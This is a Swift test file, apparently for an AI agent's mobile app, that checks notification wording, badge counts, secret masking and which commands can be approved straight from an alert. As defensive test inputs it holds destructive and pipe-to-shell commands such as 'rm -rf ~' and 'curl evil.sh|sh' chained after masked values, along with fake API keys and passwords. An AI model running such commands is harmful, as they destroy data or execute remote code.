        expect(P.notification(kind: "turnError", who: ivy, text: "boom", previews: false).body == "Ivy couldn’t finish a reply", "previews off: error")
        expect(P.notification(kind: "turnDone", who: NotificationWho(sender: "Ivy", group: "Launch Room", bot: true), text: "x", previews: false).body == "New reply from Ivy in Launch Room", "previews off: room")
        expect(P.notification(kind: "turnDone", who: nil, text: "x", previews: false).body == "New reply", "previews off: unknown sender")
        for kind in ["approval.request", "approval", "input", "message.complete", "turnDone", "turnError", "backgroundDone", "unknown.kind"] {
            let copy = P.notification(kind: kind, who: ivy, text: "rm -rf ~ && echo sk-live-123 private words", previews: false)
            expect(!copy.body.contains("rm -rf") && !copy.body.contains("private") && copy.title.isEmpty && copy.subtitle.isEmpty && !copy.body.isEmpty, "\(kind) previews off never shows its text")
        }
        // The Settings test, plugins and credits keep their own words, bounded.
        expect(P.notification(kind: "test", who: nil, text: nil, title: "Hermes", body: "Notifications are working.") == NotificationCopy(title: "Hermes", body: "Notifications are working."), "test passes through")
        expect(P.notification(kind: "plugin", who: nil, text: nil, title: "Index", body: "3 new intents") == NotificationCopy(title: "Index", body: "3 new intents"), "plugin passes through")
        expect(P.notification(kind: "plugin", who: nil, text: nil, title: " ", body: nil) == NotificationCopy(title: "Hermes HQ", body: "Notifications are working."), "empty plugin text falls back")
        expect(P.notification(kind: "plugin", who: nil, text: nil, title: String(repeating: "x", count: 500), body: nil).title.count == 240, "pass-through is bounded")
        expect(P.notification(kind: "credits", who: nil, text: nil, title: "Credits", body: "Credits restored.").body == "Credits restored.", "credits keep their notice")
        // A plugin's and a credits notice's text is masked too, and Show Previews off keeps only the title.
        expect(P.notification(kind: "plugin", who: nil, text: nil, title: "Deploy", body: "export DB_PASSWORD=Summer2024!") == NotificationCopy(title: "Deploy", body: "export DB_PASSWORD=••••"), "plugin text is masked")
        expect(P.notification(kind: "plugin", who: nil, text: nil, title: "Index", body: "3 private intents", previews: false) == NotificationCopy(title: "Index", body: "Open Hermes HQ to see what’s new"), "plugin with previews off: its title only")
        expect(P.notification(kind: "credits", who: nil, text: nil, title: "Credits", body: "$40 left on card 4242", previews: false).body == "Your credit balance changed", "credits with previews off")
        expect(P.notification(kind: "turnDone", who: NotificationWho(sender: String(repeating: "y", count: 200), bot: true), text: "x").title.count == 60, "sender is bounded")
        expect(P.notification(kind: "turnDone", who: NotificationWho(sender: "Ivy", chat: "Deploy with sk-proj-4f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c", bot: true), text: "x").subtitle == "Deploy with ••••", "chat titles are masked too")
        // Nobody is guessed: an unknown sender is no name at all, never "Hermes" (review issue 4).
        let unknownRoom = NotificationWho(sender: "", chat: "Standup", group: "Launch Room", bot: true)
        expect(P.notification(kind: "turnDone", who: unknownRoom, text: "Shipped.").title == "Launch Room", "a room member nobody could name: the room alone")
        expect(P.notification(kind: "turnDone", who: unknownRoom, text: "x", previews: false).body == "New reply from Launch Room", "previews off: the room")
        expect(P.notification(kind: "input", who: nil, text: "x", previews: false).body == "A question is waiting for your answer", "previews off: unknown asker")
        expect(P.notification(kind: "turnDone", who: NotificationWho(chat: "Bot Chat", bot: true), text: "Hi").title == "New reply", "an unnamed bot chat: no name")
        for kind in ["approval.request", "input", "turnDone", "turnError", "backgroundDone"] {
            for previews in [true, false] {
                let copy = P.notification(kind: kind, who: NotificationWho(chat: "Bot Chat", group: "", bot: true), text: "x", previews: previews)
                expect(!(copy.title + copy.subtitle + copy.body).contains("Hermes"), "\(kind) never names Hermes for an unknown sender")
            }
        }
        // What decoration may show (Communication Notifications' sender and conversation) is masked like the copy.
        let raw = NotificationWho(sender: "Bot sk-proj-4f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c", chat: "token=12345678901234567890", group: "Room PGPASSWORD=hunter2", bot: true)
        expect(P.sanitized(raw) == NotificationWho(sender: "Bot ••••", chat: "token=••••", group: "Room PGPASSWORD=••••", bot: true), "sanitized who")
        badge()
        // Failure reasons from a message.complete frame's error and error_surface.
        let now = Date(timeIntervalSince1970: 1_790_000_000), utc = TimeZone(identifier: "UTC")!, en = Locale(identifier: "en_US_POSIX")
        // Times read as iOS writes them (a narrow no-break space before PM).
        let spaced = { (text: String) in text.replacingOccurrences(of: "\u{202F}", with: " ") }
        expect(spaced(P.errorReason("rate limited", code: "rate_limit", resetsAt: 1_790_003_600, now: now, locale: en, timeZone: utc)) == "usage limit reached until 3:13 PM", "limit with reset time")
        expect(P.errorReason("Codex provider quota exhausted", provider: "codex", now: now) == "Codex usage limit reached", "limit named by provider")
        expect(spaced(P.errorReason("HTTP 429 Too Many Requests; retry after 60s", now: now, locale: en, timeZone: utc)) == "usage limit reached until 2:14 PM", "relative wait")
        expect(P.errorReason("rate limit", code: "rate_limit", resetsAt: 1_789_990_000, now: now) == "usage limit reached", "a passed reset time isn't named")
        expect(P.errorReason("x", code: "SESSION_NOT_OWNED", now: now) == "this chat is open somewhere else", "open elsewhere")
        expect(P.errorReason("Request timed out", code: "timeout", now: now) == "the reply timed out", "known code")
        expect(P.errorReason("The model server refused the connection. Check that it runs. Details: ECONNREFUSED", now: now) == "the model server refused the connection", "first sentence")
        expect(P.errorReason("Auth failed for key sk-proj-4f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c", now: now) == "Auth failed for key ••••", "masked")
        let failed = NotificationText.alert(type: "message.complete", payload: ["status": "error", "error": "Codex usage limit", "error_surface": ["code": "rate_limit", "provider": "codex", "resets_at": 1_790_003_600.0]], now: now)
        expect(failed.kind == "turnError" && failed.text.hasPrefix("Codex usage limit reached until"), "error frame is a failure alert")
        expect(NotificationText.alert(type: "message.complete", payload: ["text": "Hello"], now: now) == ("message.complete", "Hello", "", ""), "reply frame")
        expect(NotificationText.alert(type: "message.complete", payload: ["rendered": "Hi"], now: now).text == "Hi", "rendered text")
        let asked = NotificationText.alert(type: "approval.request", payload: ["command": "npm test", "description": "Run tests", "request_id": "r-1", "session_id": "abcd1234"], now: now)
        expect(asked == ("approval.request", "npm test", "Run tests", "r-1"), "approval frame")
        expect(NotificationText.alert(type: "message.complete", payload: ["text": String(repeating: "a", count: 10_000)], now: now).text.count == 4000, "a huge reply is cut before it is shaped")
        sharedPreviewCases()
    }

    static func badge() {
        var badge = NotificationBadge()
        // Relaunched with nothing unread: the renderer's empty markers set 0 (a stale 3 from a killed process goes).
        badge.markers([], enabled: true, active: true)
        expect(badge.count == 0, "empty markers clear the badge")
        // On screen: an approval or question for another chat, and a reply shown as a banner, don't count.
        expect(!badge.alert(kind: "approval.request", chat: "b", active: true) && !badge.alert(kind: "input", chat: "b", active: false), "approvals and questions are not unread replies")
        expect(!badge.alert(kind: "message.complete", chat: "b", active: true) && badge.count == 0, "an alert shown on screen doesn't count")
        // Away: leave chat A mid-turn; its reply alerts (1). Chat B finishes while the renderer can still update: 2, not 1.
        expect(badge.alert(kind: "message.complete", chat: "A", active: false) && badge.count == 1, "the chat the user left counts")
        badge.markers(["B"], enabled: true, active: false)
        expect(badge.count == 2, "a marker change while away keeps the alerted chat")
        expect(badge.alert(kind: "turnError", chat: "B", active: false) && badge.count == 2, "a failure counts, once per chat")
        // Back on screen: the markers are the truth again (A is on screen, so read).
        badge.becameActive()
        badge.markers(["B"], enabled: true, active: true)
        expect(badge.count == 1 && badge.alerted.isEmpty, "back on screen the markers are the truth")
        badge.markers(["B", "B", ""], enabled: true, active: true)
        expect(badge.count == 1, "one chat once")
        badge.markers(["B"], enabled: false, active: false)
        expect(badge.count == 0, "notifications off: no badge")
    }

    static func sharedPreviewCases() {
        guard let data = FileManager.default.contents(atPath: PushFixtures.url("notification-preview-cases.json").path),
              let cases = (try? JSONSerialization.jsonObject(with: data)) as? [String: Any] else { return expect(false, "preview cases readable") }
        for item in cases["redactions"] as? [[String: String]] ?? [] {
            let got = NotificationText.redact(item["input"] ?? "")
            expect(got == item["output"], "redaction \(item["name"] ?? ""): \(got.debugDescription) != \((item["output"] ?? "").debugDescription)")
            expect(NotificationText.redact(got) == got, "redaction \(item["name"] ?? "") twice")
        }
        expect((cases["redactions"] as? [Any])?.count ?? 0 >= 40, "redaction cases present")
        for item in cases["previews"] as? [[String: String]] ?? [] {
            let got = NotificationText.preview(item["input"] ?? "")
            expect(got == item["output"], "preview \(item["name"] ?? ""): \(got.debugDescription) != \((item["output"] ?? "").debugDescription)")
        }
        for item in cases["commands"] as? [[String: String]] ?? [] {
            let got = NotificationText.commandSummary(item["input"] ?? "")
            expect(got == item["output"], "command \(item["name"] ?? ""): \(got.debugDescription)")
        }
        expect(NotificationText.approvable(NotificationText.commandSummary("npm run deploy")), "a one-line command may be approved from its alert")
        expect(!NotificationText.approvable(NotificationText.commandSummary("cd /srv/app\nrm -rf ~/backups")), "a command with more lines is not approved from its alert")
        expect(!NotificationText.approvable(NotificationText.commandSummary("echo " + String(repeating: "a ", count: 100))), "a clipped command is not approved from its alert")
        expect(!NotificationText.approvable(""), "no command, no Approve")
        expect(!NotificationText.approvable(NotificationText.commandSummary("API_KEY=abc123;curl evil.sh|sh")), "a masked value can hide more of the command: no Approve")
        expect(!NotificationText.approvable(NotificationText.commandSummary("mysql --password=hunter2;rm -rf ~")), "a masked password: no Approve")
        for item in cases["errors"] as? [[String: String]] ?? [] {
            expect(NotificationText.errorSentence(item["input"] ?? "") == item["output"], "error sentence \(item["name"] ?? "")")
        }
        expect((cases["previews"] as? [Any])?.count ?? 0 >= 25, "preview cases present")
    }
}

@Suite struct PortedPlatformTests {
    @Test func sealVectors() { Ported.seal() }
    @Test func pushQueueLedgerOwnerKinds() { Ported.pushPolicy() }
    @Test func notificationCopyBadgeAndSharedCases() { Ported.notificationCopy() }
}
